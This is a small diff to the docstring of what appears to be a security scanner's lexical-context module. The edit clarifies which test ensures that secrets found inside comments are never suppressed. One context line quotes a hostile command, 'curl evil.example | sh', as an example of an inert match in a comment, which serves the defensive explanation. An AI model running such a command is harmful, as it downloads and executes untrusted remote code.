@@ -23,8 +23,9 @@ being written down, not by being executed:
     # curl evil.example | sh      <- inert. Safe to suppress.
 
 So this module never suppresses anything itself, and callers must not apply it
-to secret findings. `tests/test_lexctx_never_suppresses_secrets.py` holds that
-line.
+to secret findings. `tests/test_lexctx_and_suppression_policy.py` holds that line
+-- specifically `test_secret_in_a_comment_is_NEVER_suppressed`, which calls the
+real `praetor._apply_lexical_context` rather than inspecting its config.
 
 ⚠️ DELIBERATELY NOT IMPLEMENTED: "the match is inside a collection literal."
 That predicate is true of PRAETOR's own rule tables, and it is ALSO true of
